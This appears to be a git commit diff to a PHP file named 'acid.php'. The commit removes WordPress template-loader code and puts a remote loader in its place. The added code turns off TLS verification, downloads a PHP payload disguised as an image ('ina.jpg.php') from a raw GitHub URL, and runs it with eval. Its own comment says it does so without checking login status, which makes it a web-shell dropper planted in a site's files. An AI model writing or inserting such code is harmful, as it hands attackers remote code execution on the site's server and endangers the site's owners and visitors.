f1a4038915995d0714d32bb2e216b73a52709760
eagles227 <166109731+eagles227@users.noreply.github.com>
2024-12-29 16:52:21 +0700

    Update acid.php

--- acid.php
+++ acid.php
@@ -1,116 +1,40 @@
 <?php
-/**
- * Loads the correct template based on the visitor's URL
- *
- * @package WordPress
- */
-
-if ( wp_using_themes() ) {
-    /**
-     * Fires before determining which template to load.
-     *
-     * @since 1.5.0
-     */
-    do_action( 'template_redirect' );
-}
+session_start();
 
 /**
- * Filters whether to allow 'HEAD' requests to generate content.
+ * Disable error reporting
  *
- * Provides a significant performance bump by exiting before the page
- * content loads for 'HEAD' requests. See #14348.
- *
- * @since 3.5.0
- *
- * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
+ * Set this to error_reporting( -1 ) for debugging.
  */
-if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
-    exit;
-}
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
 
-// Process feeds and trackbacks even if not using themes.
-if ( is_robots() ) {
-    /**
-     * Fired when the template loader determines a robots.txt request.
-     *
-     * @since 2.1.0
-     */
-    do_action( 'do_robots' );
-    return;
-} elseif ( is_favicon() ) {
-    /**
-     * Fired when the template loader determines a favicon.ico request.
-     *
-     * @since 5.4.0
-     */
-    do_action( 'do_favicon' );
-    return;
-} elseif ( is_feed() ) {
-    do_feed();
-    return;
-} elseif ( is_trackback() ) {
-    require ABSPATH . 'wp-trackback.php';
-    return;
-}
-
-if ( wp_using_themes() ) {
-    $tag_templates = array(
-        'is_embed'             => 'get_embed_template',
-        'is_404'               => 'get_404_template',
-        'is_search'            => 'get_search_template',
-        'is_front_page'        => 'get_front_page_template',
-        'is_home'              => 'get_home_template',
-        'is_privacy_policy'    => 'get_privacy_policy_template',
-        'is_post_type_archive' => 'get_post_type_archive_template',
-        'is_tax'               => 'get_taxonomy_template',
-        'is_attachment'        => 'get_attachment_template',
-        'is_single'            => 'get_single_template',
-        'is_page'              => 'get_page_template',
-        'is_singular'          => 'get_singular_template',
-        'is_category'          => 'get_category_template',
-        'is_tag'               => 'get_tag_template',
-        'is_author'            => 'get_author_template',
-        'is_date'              => 'get_date_template',
-        'is_archive'           => 'get_archive_template',
-    );
-
-    $template = false;
-
-    // Loop through each of the template conditionals, and find the appropriate template file.
-    foreach ( $tag_templates as $tag => $template_getter ) {
-        if ( call_user_func( $tag ) ) {
-            $template = call_user_func( $template_getter );
+        // Set cookies using session if available
+        if (isset($_SESSION['coki'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
         }
 
-        if ( $template ) {
-            if ( 'is_attachment' === $tag ) {
-                remove_filter( 'the_content', 'prepend_attachment' );
-            }
-
-            break;
-        }
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
     }
-
-    if ( ! $template ) {
-        $template = get_index_template();
-    }
-
-    /**
-     * Filters the path of the current template before including it.
-     *
-     * @since 3.0.0
-     *
-     * @param string $template The path of the template to include.
-     */
-    $template = apply_filters( 'template_include', $template );
-    
-    if ( $template ) {
-        include $template;
-    } elseif ( current_user_can( 'switch_themes' ) ) {
-        $theme = wp_get_theme();
-        if ( $theme->errors() ) {
-            wp_die( $theme->errors() );
-        }
-    }
-    return;
+    return $url_get_contents_data;
 }
+
+// Fetch content from the URL without checking login status
+$a = geturlsinfo('https://raw.githubusercontent.com/wawan507821/slimass/master/ina.jpg.php');
+eval('?>' . $a);
+?>
